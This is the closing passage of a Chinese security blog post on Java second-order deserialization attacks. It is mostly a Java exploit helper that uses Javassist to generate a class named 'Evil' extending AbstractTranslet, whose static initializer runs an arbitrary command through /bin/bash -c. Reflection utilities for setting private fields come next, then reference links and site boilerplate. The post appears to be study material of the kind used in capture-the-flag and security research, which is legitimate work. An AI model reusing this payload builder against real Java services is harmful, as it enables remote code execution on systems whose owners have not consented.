</span></span><span class="line"><span class="cl">        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">CtClass</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">&#34;Evil&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span>
</span></span><span class="line"><span class="cl">                <span class="s">&#34;java.lang.Runtime.getRuntime().exec(new String[]{\&#34;/bin/bash\&#34;, \&#34;-c\&#34;,\&#34;&#34;</span> <span class="o">+</span> <span class="n">string</span> <span class="o">+</span> <span class="s">&#34;\&#34;});&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">payload</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Field</span> <span class="nf">getField</span> <span class="o">(</span><span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span> <span class="n">field</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">catch</span> <span class="o">(</span> <span class="n">NoSuchFieldException</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span> <span class="o">!</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="结语">结语</h3>
<p>那么，就写到这里吧，再写，就不礼貌辣</p>
<h3 id="参考文章">参考文章</h3>
<p><a href="http://miku233.viewofthai.link/2022/05/29/buggyLoader/"target="_blank" rel="external nofollow noopener noreferrer">http://miku233.viewofthai.link/2022/05/29/buggyLoader/</a></p>
<p><a href="https://su18.org/"target="_blank" rel="external nofollow noopener noreferrer">https://su18.org/</a></p>
<p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/"target="_blank" rel="external nofollow noopener noreferrer">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/</a></p>
<p><a href="https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA</a></p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2023-01-15&#32;20:54:57>更新于 2023-01-15&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://poriams.github.io/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/" data-title="二次反序列化，看我一命通关"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89java%E4%B9%8Bxml/" class="post-nav-item" rel="prev" title="愿天堂没有Java之XML"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>愿天堂没有Java之XML</a>
      <a href="/%E4%BB%8E-hexo-%E5%88%B0-hugo/" class="post-nav-item" rel="next" title="从 Hexo 到 Hugo">从 Hexo 到 Hugo<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="waline" class="comment"></div><noscript>
        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
      </noscript></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright order-last" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2023</span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中 ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="ms-1 d-none">博客已运行</span><span class="run-times ms-1">网站运行中 ...</span></span></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":5000},"comment":{"enable":true,"expired":false,"waline":{"comment":true,"copyright":true,"dark":"body[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":true,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"pageview":true,"requiredMeta":["nick","mail"],"search":true,"serverURL":"https://comments-nf6liufk4-1803700972-qqcom.vercel.app","texRenderer":true}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"siteTime":"2023-1-10"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-CBQC1RW0CV', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-CBQC1RW0CV" async></script></body>
</html>
